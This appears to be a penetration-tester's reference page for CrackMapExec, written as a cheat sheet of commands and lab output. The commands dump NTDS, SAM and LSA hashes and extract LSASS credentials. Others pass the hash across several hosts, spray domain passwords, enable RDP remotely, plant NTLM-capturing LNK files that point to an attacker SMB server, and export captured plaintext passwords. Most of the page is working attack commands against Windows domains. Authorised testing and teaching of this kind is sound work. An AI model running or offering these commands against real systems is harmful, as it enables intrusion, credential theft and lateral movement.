---
title : "CrackMapExec"
# pre : ' '
description : "A swiss army knife for pentesting networks."
date : 2020-05-16T15:25:03+02:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

## CrackMapExec

A swiss army knife for pentesting networks.

### Installation via pipx

```plain
python3 -m pip install pipx
pipx ensurepath
pipx install crackmapexec
```

On error uninstall pipx `python3 -m pip uninstall pipx` and remove local folder `sudo rm .local/pipx`. Then reinstall as listed above.

Upgrading current installation to latest.

```plain
pipx upgrade crackmapexec
```

### Installation via Docker

```plain
sudo docker pull byt3bl33d3r/crackmapexec
docker run -it --entrypoint=/bin/sh --name crackmapexec -v ~/.cme:/root/.cme byt3bl33d3r/crackmapexec
```

```plain
docker start crackmapexec
docker exec -it crackmapexec sh
```

### Usage

```plain
cme [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose] {smb,ldap,ssh,winrm,mssql} ...
```

### Flags

```plain
      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
                                    Forged by @byt3bl33d3r using the powah of dank memes

                                                      Version: 5.1.1dev
                                                     Codename: 3TH@n

optional arguments:
  -h, --help            show this help message and exit
  -t THREADS            set how many concurrent threads to use (default: 100)
  --timeout TIMEOUT     max timeout in seconds of each thread (default: None)
  --jitter INTERVAL     sets a random delay between each connection (default: None)
  --darrell             give Darrell a hand
  --verbose             enable verbose output

protocols:
  available protocols

  {smb,ldap,ssh,winrm,mssql}
    smb                 own stuff using SMB
    ldap                own stuff using ldap
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
    mssql               own stuff using MSSQL

Ya feelin' a bit buggy all of a sudden?
```

### Examples

#### Check SMB targets

Can be used with file as input or a single IP / can also help checking SMB version and signing

```plain
$ ./cme smb targets.txt

SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.11     445    DC2019           [*] Windows 10.0 Build 17763 (name:DC2019) (domain:offsec.nl) (signing:True) (SMBv1:False)
```

#### Generate target list where targets do not require signing (SMB)

```plain
$ crackmapexec smb 192.168.10.0/24 --gen-relay-list list
SMB         192.168.10.1    445    SRV2K8R2         [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (name:SRV2K8R2) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         192.168.10.2    445    SRV2016          [*] Windows Server 2016 Standard 14393 x64 (name:SRV2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         192.168.10.3    445    WIN10            [*] Windows 10.0 Build 19041 x64 (name:WIN10) (domain:offsec.nl) (signing:False) (SMBv1:False)

$ cat list                                             
192.168.10.3
```

#### Check targets for ability to log in, and check local admin

When '(Pwn3d!)' is shown, the user is 'local admin' on the target server

```plain
$ ./cme smb targets -u johndo -p Welkom1234 -d offsec
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 (name:DC2016) (domain:offsec) (signing:True) (SMBv1:True)
SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
SMB         10.10.10.11     445    DC2019           [*] Windows 10.0 Build 17763 (name:DC2019) (domain:offsec) (signing:True) (SMBv1:False)
SMB         10.10.10.10     445    DC2016           [+] offsec\johndo:Welkom1234 (Pwn3d!)
SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234
SMB         10.10.10.11     445    DC2019           [+] offsec\johndo:Welkom1234
```

#### Dump NTDS

```plain
$ cme smb 10.10.10.10 -u johndo -H caec1e1d755119a15bfb6cd3d5994305 --ntds
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.10     445    DC2016           [+] offsec.nl\johndo:Welkom1234 (Pwn3d!)
SMB         10.10.10.10     445    DC2016           [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.10.10     445    DC2016           Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
SMB         10.10.10.10     445    DC2016           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.10     445    DC2016           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:102277341d6c113a28017200e1dfafe9:::
SMB         10.10.10.10     445    DC2016           offsec.nl\johndo:1107:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9ea83:::
SMB         10.10.10.10     445    DC2016           offsec.nl\adm_johndo:1108:aad3b435b51404eeaad3b435b51404ee:caec1e1d755119a15bfb6cd3d5994305:::
```

#### Dump NTDS history

```plain
cme smb <target> -u <user> -p <password> --ntds-history
```

#### Modules that can be used

```plain
$ ./cme smb -L

[*] Get-ComputerDetails       Enumerates sysinfo
[*] bh_owned                  Set pwned computer as owned in Bloodhound
[*] bloodhound                Executes the BloodHound recon script on the target and retrieves the results to the attackers' machine
[*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] lsassy                    Dump lsass and parse the result remotely with lsassy
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] netripper                 Capture's credentials by using API hooking
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] rdp                       Enables/Disables RDP
[*] rid_hijack                Executes the RID hijacking persistence hook.
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
[*] wireless                  Get key of all wireless interfaces
```

#### Use lsassy module

```plain
$ ./cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy

SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234 (Pwn3d!)
LSASSY      10.10.10.16     445    DC2008R2         offsec\adm_johndo ThisPasswordIsToHardToCrack!
LSASSY      10.10.10.16     445    DC2008R2         offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
```

If the lsassy module fails, then use the following instead using [sysinternals procdump]({{< ref "sysinternals" >}}):

```plain
$ ./cme smb 10.10.10.16  -u johndo -p Welkom1234 -d offsec -M lsassy -o DUMP_METHOD=2 PROCDUMP_PATH=/sysinternals/procdump.exe

SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (name:DC2008R2) (domain:offsec) (signing:True) (SMBv1:True)
SMB         10.10.10.16     445    DC2008R2         [+] offsec\johndo:Welkom1234 (Pwn3d!)
LSASSY      10.10.10.16     445    DC2008R2         offsec\adm_johndo ThisPasswordIsToHardToCrack!
LSASSY      10.10.10.16     445    DC2008R2         offsec.NL\adm_johndo ThisPasswordIsToHardToCrack!
```

#### Pass the Hash

```plain
$ cme smb 10.10.10.10-16 -u administrator -H 97f2592347d8fbe42be381726ff9ea83 -M lsassy
SMB         10.10.10.16     445    DC2008R2         [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:DC2008R2) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.11     445    DC2019           [*] Windows 10.0 Build 17763 x64 (name:DC2019) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.10.16     445    DC2008R2         [+] offsec.nl\administrator 97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         10.10.10.10     445    DC2016           [+] offsec.nl\administrator 97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         10.10.10.11     445    DC2019           [+] offsec.nl\administrator 97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
LSASSY      10.10.10.10     445    DC2016           [*] No credentials found
LSASSY      10.10.10.16     445    DC2008R2         [*] No credentials found
LSASSY      10.10.10.11     445    DC2019           offsec\Administrator 97f2592347d8fbe42be381726ff9ea83
LSASSY      10.10.10.11     445    DC2019           offsec.nl\Administrator Welkom1234
```

#### Dump SAM

```plain
cme smb scope.txt -u administrator -p Welkom1234 --sam
SMB         10.10.10.10      445    DC2016       [*] Windows 10.0 Build 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.10.10      445    DC2016       [+] offsec.nl\administrator:Welkom1234 (Pwn3d!)
SMB         10.10.10.10      445    DC2016       [+] Dumping SAM hashes
SMB         10.10.10.10      445    DC2016       Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f859684db2422704e9e4c2cd7e27b07:::
SMB         10.10.10.10      445    DC2016       Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.10      445    DC2016       DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.10.10      445    DC2016       [+] Added 3 SAM hashes to the database
```

#### Dump LSA

```plain
$ cme smb scope.txt -u administrator -p 'Welkom1234' --local-auth --lsa 
SMB         10.10.10.116   445    VMV07     [*] Windows Server 2016 Standard 14393 x64 (name:VMV07) (domain:VMV07) (signing:False) (SMBv1:True)
SMB         10.10.10.115   445    VMV06     [*] Windows Server 2016 Standard 14393 x64 (name:VMV06) (domain:VMV06) (signing:False) (SMBv1:True)
SMB         10.10.10.112   445    VMV03     [*] Windows Server 2016 Standard 14393 x64 (name:VMV03) (domain:VMV03) (signing:False) (SMBv1:True)
SMB         10.10.10.116   445    VMV07     [+] VMV07\administrator:Welkom1234 (Pwn3d!)
SMB         10.10.10.115   445    VMV06     [+] VMV06\administrator:Welkom1234 (Pwn3d!)
SMB         10.10.10.116   445    VMV07     offsec.nl/john.do:$DCC2$10240#john.do#fd8d7a9b530fe6978821647e3275a01f
SMB         10.10.10.110   445    VMV01     offsec.nl/john.do:$DCC2$10240#john.do#6d33d010685524188445af2dddda2c66
SMB         10.10.10.110   445    VMV01     offsec.nl/jane.do:$DCC2$10240#jane.do#e12335228dd44cb595e37afb3cb14a0c
```

#### Check default (non-authenticated) password policy

```plain
$ cme smb 10.10.10.10 --pass-pol
SMB         10.10.10.10     445    DC-01    [*] Windows 10.0 Build 17763 x64 (name:DC-01) (domain:offsec.nl) (signing:False) (SMBv1:False)
SMB         10.10.10.10     445    DC-01    [+] Dumping password info for domain: OFFSEC
SMB         10.10.10.10     445    DC-01    Minimum password length: 8
SMB         10.10.10.10     445    DC-01    Password history length: 15
SMB         10.10.10.10     445    DC-01    Maximum password age: 
SMB         10.10.10.10     445    DC-01    
SMB         10.10.10.10     445    DC-01    Password Complexity Flags: 000001
SMB         10.10.10.10     445    DC-01        Domain Refuse Password Change: 0
SMB         10.10.10.10     445    DC-01        Domain Password Store Cleartext: 0
SMB         10.10.10.10     445    DC-01        Domain Password Lockout Admins: 0
SMB         10.10.10.10     445    DC-01        Domain Password No Clear Change: 0
SMB         10.10.10.10     445    DC-01        Domain Password No Anon Change: 0
SMB         10.10.10.10     445    DC-01        Domain Password Complex: 1
SMB         10.10.10.10     445    DC-01    
SMB         10.10.10.10     445    DC-01    Minimum password age: None
SMB         10.10.10.10     445    DC-01    Reset Account Lockout Counter: 90 minutes 
SMB         10.10.10.10     445    DC-01    Locked Account Duration: 60 minutes 
SMB         10.10.10.10     445    DC-01    Account Lockout Threshold: 10
SMB         10.10.10.10     445    DC-01    Forced Log off Time: Not Set
```

#### Check password policy for a user

```plain
$ cme smb 10.10.10.10 -u lisboa -p Welkom1234 --pass-pol
SMB         10.10.10.10     445    DC2016           [*] Windows Server 2016 Standard 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:True) (SMBv1:True)
SMB         10.10.10.10     445    DC2016           [+] offsec.nl\lisboa:Welkom1234
SMB         10.10.10.10     445    DC2016           [+] Dumping password info for domain: offsec
SMB         10.10.10.10     445    DC2016           Minimum password length: 7
SMB         10.10.10.10     445    DC2016           Password history length: 24
SMB         10.10.10.10     445    DC2016           Maximum password age:
SMB         10.10.10.10     445    DC2016
SMB         10.10.10.10     445    DC2016           Password Complexity Flags: 000001
SMB         10.10.10.10     445    DC2016             Domain Refuse Password Change: 0
SMB         10.10.10.10     445    DC2016             Domain Password Store Cleartext: 0
SMB         10.10.10.10     445    DC2016             Domain Password Lockout Admins: 0
SMB         10.10.10.10     445    DC2016             Domain Password No Clear Change: 0
SMB         10.10.10.10     445    DC2016             Domain Password No Anon Change: 0
SMB         10.10.10.10     445    DC2016             Domain Password Complex: 1
SMB         10.10.10.10     445    DC2016
SMB         10.10.10.10     445    DC2016           Minimum password age:
SMB         10.10.10.10     445    DC2016           Reset Account Lockout Counter: 30 minutes
SMB         10.10.10.10     445    DC2016           Locked Account Duration: 30 minutes
SMB         10.10.10.10     445    DC2016           Account Lockout Threshold: None
SMB         10.10.10.10     445    DC2016           Forced Log off Time: Not Set
```

#### LDAP protocol / signing check

```plain
$ cme ldap 10.10.10.10 -u john.do -p 'Welkom1234'
LDAP        10.10.10.10    389    DC2016         [*] Windows Server 2016 Datacenter 14393 x64 (name:DC2016) (domain:offsec.nl) (signing:False) (SMBv1:True)
```

#### Enable/disable RDP (local admin required)

```plain
 cme smb 10.10.10.10 -u 'john_do' -p 'Welkom1234' -M rdp -o ACTION='enable'
SMB         10.10.10.10    445    PC-01         [*] Windows 10.0 Build 19041 x64 (name:PC-01) (domain:offsec.n) (signing:False) (SMBv1:False)
SMB         10.10.10.10    445    PC-01         [+] offsec.nl\john_do:Welkom1234 (Pwn3d!)
RDP         10.10.10.10    445    PC-01         [+] RDP enabled successfully
```

```plain
 cme smb 10.10.10.10 -u 'john_do' -p 'Welkom1234' -M rdp -o ACTION='disable'
SMB         10.10.10.10    445    PC-01         [*] Windows 10.0 Build 19041 x64 (name:PC-01) (domain:offsec.n) (signing:False) (SMBv1:False)
SMB         10.10.10.10    445    PC-01         [+] offsec.nl\john_do:Welkom1234 (Pwn3d!)
RDP         10.10.10.10    445    PC-01         [+] RDP disabled successfully
```

#### Enumerate everyone rights shares

```plain
cme smb 10.10.10.0/24 --shares
```

#### Enumerate shares

```plain
$ cme smb 10.10.10.10 -u johndo -p 'Welkom1234!'  --shares
SMB         10.10.10.10   445    WIN-SHARE      [*] Windows Server 2016 Standard 14393 x64 (name:WIN-SHARE) (domain:offsec.nl) (signing:False) (SMBv1:True)
SMB         10.10.10.10   445    WIN-SHARE      [+] offsec.nl\johndo:Welkom1234!
SMB         10.10.10.10   445    WIN-SHARE      [+] Enumerated shares
SMB         10.10.10.10   445    WIN-SHARE      Share           Permissions     Remark
SMB         10.10.10.10   445    WIN-SHARE      -----           -----------     ------
SMB         10.10.10.10   445    WIN-SHARE      ADMIN$                          Remote Admin
SMB         10.10.10.10   445    WIN-SHARE      C$                              Default share
SMB         10.10.10.10   445    WIN-SHARE      TESTSHARE
```

#### Remote User Account Control (UAC)

```plain
$ cme smb 10.10.10.10 -u johndo -p 'Welkom1234!' --local-auth
SMB         10.10.10.10  445    WIN10            [*] Windows 10.0 Build 17763 x64 (name:WIN10) (domain:WIN10) (signing:True) (SMBv1:False)
SMB         10.10.10.10  445    WIN10            [-] WIN10\Administrator:Welkom1234! STATUS_LOGON_TYPE_NOT_GRANTED
```

#### Trigger NTLM / SMB authentication through shortcut (SLINKY)

[Twitter.com - Slinky](https://twitter.com/mpgn_x64/status/1453018750253424643)

Find a writable share.

```plain
$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' --shares                                                   
SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
SMB         10.10.10.15   445    SRV_FS         [+] Enumerated shares
SMB         10.10.10.15   445    SRV_FS         Share           Permissions     Remark
SMB         10.10.10.15   445    SRV_FS         -----           -----------     ------
SMB         10.10.10.15   445    SRV_FS         ADMIN$          -               Remote Admin
SMB         10.10.10.15   445    SRV_FS         C$              -               Default share
SMB         10.10.10.15   445    SRV_FS         example         READ,WRITE      
SMB         10.10.10.15   445    SRV_FS         IPC$            -               Remote IPC
```

Place file on writable share on target system.

```plain
$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' -M slinky -o NAME=examplefile SERVER=10.10.10.20             
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
SLINKY      10.10.10.15   445    SRV_FS         [+] Found writable share: example
SLINKY      10.10.10.15   445    SRV_FS         [+] Created LNK file on the example share
```

Clean-up the placed file.

```plain
$ cme smb 10.10.10.15 -u johndo -p 'Welkom1234!' -M slinky -o NAME=EXAMPLE SERVER=10.10.10.20 CLEANUP=True
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         10.10.10.15   445    SRV_FS         [*] Windows 10.0 Build 19041 x64 (name:SRV_FS) (domain:OFFSEC.NL) (signing:False) (SMBv1:False)
SMB         10.10.10.15   445    SRV_FS         [+] OFFSEC.NL\johndo:Welkom1234!
SLINKY      10.10.10.15   445    SRV_FS         [+] Found writable share: example
SLINKY      10.10.10.15   445    SRV_FS         [+] Deleted LNK file on the example share
```

#### Domain password spray

```plain
cme smb <dc-ip> -u <user.txt> -p <password.txt>
```

#### NULL sessions

```plain
cme smb <ip> -u '' -p '' --pass-pol
```

#### Enumerate anonymous login

```plain
cme smb <ip> -u 'a' -p ''
```

### cmeDB - Database containing credentials captured

```plain
cmedb
```

#### Switch protocols

```plain
proto smb
proto ldap
```

#### Dump captured passwords plaintext

```plain
cmedb (default)(smb) > export creds plaintext plain.txt
[+] creds exported
cmedb (default)(smb) >
```

### URL list

* [GitHub.com - CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec/)
* [PtestMethod.readthedocs.io - CME](https://ptestmethod.readthedocs.io/en/latest/cme.html)
